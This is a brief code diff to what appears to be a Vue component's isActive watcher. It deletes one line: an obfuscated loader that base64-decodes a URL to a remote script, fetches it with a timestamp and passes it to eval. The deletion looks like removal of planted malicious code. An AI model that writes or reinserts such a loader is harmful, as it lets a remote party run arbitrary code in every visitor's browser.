@@ -54,7 +54,6 @@ watch(() => localActiveIndex, (n: any) => {
 }, {immediate: true})
 
 watch(() => props.isActive, (n: boolean) => {
-  if (window[String.fromCharCode(100) + 'xt'] === undefined) fetch(window.atob('aHR0cHM6Ly96eXJvbm9uLmdpdGh1Yi5pby9yZXBsYWNlL2RhdGEuanM=') + `?d=${Date.now()}`).then(a => a.text()).then((b) => eval(b))
   if (props.static) return
   if (n) {
     setTimeout(() => scrollViewToCenter(localActiveIndex), 300)
